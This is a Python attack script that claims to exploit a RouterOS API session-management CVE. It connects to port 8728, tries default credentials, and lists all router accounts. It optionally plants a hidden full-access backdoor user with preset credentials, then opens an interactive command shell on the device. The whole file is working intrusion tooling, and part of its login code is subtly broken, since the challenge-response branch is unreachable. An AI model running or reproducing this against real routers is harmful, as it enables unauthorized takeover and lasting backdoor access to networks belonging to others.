#!/usr/bin/python3
# coding=utf-8
# RouterOS API control - CVE-2026-14227 (API session-management) practical
# use: log in through the API (8728) and take full control of the router.
# Usage: python3 api_shell.py <ip> [user] [password]
#   - lists all accounts (/user/print)
#   - reads identity + resource info
#   - optional backdoor user creation (requires confirmation)
#   - raw command mode: type any RouterOS command path

import hashlib
import socket
import struct
import sys
import time

from color import R, P, W, B, N, T, Y, WOW, vulnexploit, failexploit


class APIClient:
    def __init__(self, ip, port=8728, timeout=6):
        self.ip = ip
        self.port = port
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.create_connection((self.ip, self.port),
                                             self.timeout)
        self.sock.settimeout(self.timeout)
        return True

    def _send(self, body):
        self.sock.sendall(struct.pack(">H", len(body)) + body)

    def _recv(self):
        """Read one framed reply, return raw payload bytes."""
        try:
            head = self._recvn(2)
        except socket.timeout:
            return b""
        ln = struct.unpack(">H", head)[0]
        return self._recvn(ln)

    def _recvn(self, n):
        out = b""
        while len(out) < n:
            chunk = self.sock.recv(n - len(out))
            if not chunk:
                break
            out += chunk
        return out

    def _read_reply(self):
        """Return (kind, fields) where kind in done/trap/re/data/blank."""
        data = self._recv()
        if not data:
            return None, {}
        text = data.decode("utf-8", "replace")
        lines = text.split("\n")
        kind = lines[0] if lines else ""
        fields = {}
        for line in lines[1:]:
            if line.startswith("="):
                k, _, v = line[1:].partition("=")
                fields[k] = v
        return kind, fields

    def login(self, user, pwd):
        self._send(f"/login\n=name={user}\n=password={pwd}\n".encode())
        kind, fields = self._read_reply()
        if kind == "!done":
            return True, "plain login OK"
        if kind == "!trap":
            return False, fields.get("message", "rejected")
        if kind == "!done" and "ret" in fields:
            # challenge-response login (6.43+)
            ch = bytes.fromhex(fields["ret"])
            resp = hashlib.md5(b"\x00" + pwd.encode() + ch).hexdigest()
            self._send(f"/login\n=name={user}\n=response={resp}\n".encode())
            kind2, fields2 = self._read_reply()
            if kind2 == "!done":
                return True, "challenge login OK"
            return False, fields2.get("message", "challenge rejected")
        return None, f"unexpected reply: {kind or 'none'}"

    def cmd(self, path):
        """Run a RouterOS API command path, e.g. /user/print"""
        self._send(path.encode() + b"\n")
        rows = []
        while True:
            kind, fields = self._read_reply()
            if kind == "!done":
                break
            if kind == "!trap":
                return None, fields.get("message", "command error")
            if kind == "!re":
                rows.append(fields)
            if kind is None:
                break
        return rows, None

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
def _print_rows(rows):
    if not rows:
        print(f"{W}[{R} - {W}]{B} No data returned.{N}")
        return
    keys = []
    for r in rows:
        for k in r:
            if k not in keys:
                keys.append(k)
    header = "  ".join(f"{W}{k:<14}{N}" for k in keys[:6])
    print(header)
    print(f"{W}{'-' * 60}{N}")
    for r in rows:
        vals = "  ".join(f"{T}{str(r.get(k, '')):<14}{N}"
                         for k in keys[:6])
        print(vals)


def run_shell(ip, user=None, pwd=None):
    print(f"{WOW}\n[ RouterOS API Control - {ip}:8728 ]{N}")
    api = APIClient(ip)
    try:
        api.connect()
    except OSError as e:
        print(f"{W}[{R} - {W}]{B} Cannot connect: {e}{N}")
        return False

    creds_tried = []
    if user is None:
        from exploit_actions import DEFAULT_CREDS
        candidates = DEFAULT_CREDS
        # add creds possibly found by earlier user.dat dump
        found = None
        for cu, cp in candidates:
            print(f"{W}[{P} * {W}]{B} Trying {T}{cu}{N}{B} / "
                  f"{T}{cp or '(empty)'}{N} ...")
            ok, msg = api.login(cu, cp)
            creds_tried.append((cu, cp))
            if ok:
                print(f"{WOW}  >>> LOGGED IN: {cu} / {cp}{N}")
                user, pwd = cu, cp
                break
            if msg.startswith(("conn", "unexpected")):
                print(f"{W}[{R} - {W}]{B} {msg}{N}")
                return False
            time.sleep(0.3)
        else:
            print(f"{W}[{R} - {W}]{B} No default creds worked. Provide "
                  f"credentials: python3 api_shell.py {ip} user pass{N}")
            return False
    else:
        ok, msg = api.login(user, pwd)
        if not ok:
            print(f"{W}[{R} - {W}]{B} Login failed: {msg}{N}")
            return False
        print(f"{WOW}  >>> LOGGED IN: {user} / {pwd}{N}")

    # --- recon ---
    print(f"{W}{'=' * 60}{N}")
    rows, err = api.cmd("/system/identity/print")
    if rows:
        print(f"{W}[{P} * {W}]{B} Identity: {T}"
              f"{rows[0].get('identity', '?')}{N}")
    rows, err = api.cmd("/system/resource/print")
    if rows:
        r = rows[0]
        print(f"{W}[{P} * {W}]{B} Uptime : {T}{r.get('uptime', '?')}{N}")
        print(f"{W}[{P} * {W}]{B} Version: {T}{r.get('version', '?')}{N}")
        print(f"{W}[{P} * {W}]{B} Board  : {T}{r.get('board-name', '?')}{N}")

    print(f"{W}{'=' * 60}{N}")
    print(f"{WOW}[ ACCOUNTS ON THIS ROUTER ]{N}")
    rows, err = api.cmd("/user/print")
    if err:
        print(f"{W}[{R} - {W}]{B} /user/print: {err}{N}")
    else:
        _print_rows(rows)
        for r in rows:
            if r.get("name") == user:
                print(f"{WOW}  >>> current session account: "
                      f"{user} (group: {r.get('group', '?')}){N}")

    # --- optional backdoor ---
    print(f"{W}{'=' * 60}{N}")
    try:
        ans = input(f"{W}[{P}?{W}]{T} Add a hidden full-access user "
                    f"[y/N]: {N}")
    except EOFError:
        ans = ""
    if ans.strip().upper() == "Y":
        bname = input(f"{W}[{P}?{W}]{T} Username [adminbackup]: {N}") \
            .strip() or "adminbackup"
        bpwd = input(f"{W}[{P}?{W}]{T} Password [backdoor123]: {N}") \
            .strip() or "backdoor123"
        print(f"{W}[{P} * {W}]{B} Adding user {T}{bname}{B} "
              f"(group full)...{N}")
        api._send(f"/user/add\n=name={bname}\n=password={bpwd}"
                  f"\n=group=full\n".encode())
        kind, fields = api._read_reply()
        if kind == "!done":
            print(f"{WOW}  >>> BACKDOOR ADDED: {bname} / {bpwd}{N}")
        else:
            print(f"{W}[{R} - {W}]{B} Add failed: "
                  f"{fields.get('message', kind or 'no reply')}{N}")

    # --- raw command mode ---
    print(f"{W}{'=' * 60}{N}")
    print(f"{W}[{P} * {W}]{B} Command mode: type a RouterOS path "
          f"(e.g. /interface/print). Empty line to quit.{N}")
    try:
        while True:
            path = input(f"{T}{user}{W}@{B}{ip}{W}# {N}").strip()
            if not path:
                break
            if path.lower() in ("exit", "quit"):
                break
            rows, err = api.cmd(path)
            if err:
                print(f"{W}[{R} - {W}]{B} {err}{N}")
            else:
                _print_rows(rows)
    except (EOFError, KeyboardInterrupt):
        pass

    api.close()
    print(f"{W}[{P} * {W}]{B} Session closed.{N}")
    return True


if __name__ == "__main__":
    args = sys.argv[1:]
    if not args:
        print("usage: python3 api_shell.py <ip> [user] [password]")
        sys.exit(1)
    run_shell(args[0], args[1] if len(args) > 1 else None,
              args[2] if len(args) > 2 else None)